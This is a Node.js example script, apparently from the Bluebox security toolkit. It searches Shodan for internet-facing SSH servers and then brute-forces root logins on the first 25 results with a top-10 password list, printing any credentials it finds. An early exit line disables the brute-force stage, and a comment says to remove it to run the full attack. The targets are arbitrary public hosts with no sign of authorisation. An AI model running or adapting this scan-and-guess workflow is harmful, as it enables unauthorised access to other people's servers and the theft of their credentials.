#!/usr/bin/env node

/*
  Copyright Jesús Pérez <jesusprubio@gmail.com>

  This code may only be used under the MIT license found at
  https://opensource.org/licenses/MIT.
*/


'use strict';

const Bluebox = require('../');
const utils = require('../lib/utils');

const box = new Bluebox();


box.events.on('info', (info) => {
  let toAdd = ':(';
  if (info.valid) { toAdd = ':)'; }

  /* eslint-disable no-console */
  // Print the no interesting ones in the same line:
  // http://stackoverflow.com/questions/11600890/how-to-erase-characters-printed-in-console
  console.log(`${info.pair[0]}  ${info.pair[1]}  ${toAdd}`);
});

console.log('Looking for hosts ...');
box.run('gather/shodan/search', {
  query: 'ssh port:22',
  keyS: 'yourShodanKeyGoesHere',
  timeout: 20000,
})
.then((res) => {
  console.log(Object.keys(res));
  const result = {};
  // eslint-disable-next-line arrow-body-style
  let hostsClean = utils.map(res.matches, (host) => {
    return {
      ip: host.ip_str,
      port: host.port,
      info: host.info,
      product: host.product,
      org: host.org,
      isp: host.isp,
    };
  });

  console.log('Found hosts', hostsClean);
  console.log(`Total: ${res.total}`);

  // References:
  // - https://www.shodan.io
  // eslint-disable-next-line max-len
  // - http://www.computerworld.com/article/3084438/security/a-black-market-is-selling-access-to-hacked-government-servers-for-6.html
  //  - 12960248/100*5 = 648012.4

  // NOTE: Comment the next line to run the full example.
  process.exit();

  // Trick to get the demo finished on a reasonable time.
  hostsClean = hostsClean.slice(0, 25);

  console.log('Brute-forcing them ...');
  const bruteHost = host => new Promise((resolve) => {
    console.log(`\nStarting for: ${host.ip}: ${host.port} ...`);

    box.run('gather/ssh/bruteCred', {
      rhost: host.ip,
      rport: host.port,
      // timeout: 25000,
      users: 'root',
      passwords: 'file:top10',
      // It doesn't have sense here because we're using the same
      // userAsPass: true,
    })
    .then((creds) => {
      console.log(`\nSSH brute done for ${host.ip}`);

      if (creds.length > 0) {
        result[`${host.ip}:${host.port}`].credentials = creds;
        console.log('Credentials found', creds);
      }
      resolve();
    })
    .catch((err) => {
      console.error('Error, brute forcing', err);
      // We don't want to stop the full chain.
      resolve();
    });
  });

  // Concurrency to one because this example is used in the demos
  // and we want to see something.
  utils.pMap(hostsClean, bruteHost, { concurrency: 1 })
  .then(() => console.log('\n\nHost explore finished, result', result))
  .catch(err => console.error('Error, exploring the hosts', err));
})
.catch(err => console.error('Error, mapping the network:', err));
/* eslint-enable no-console */
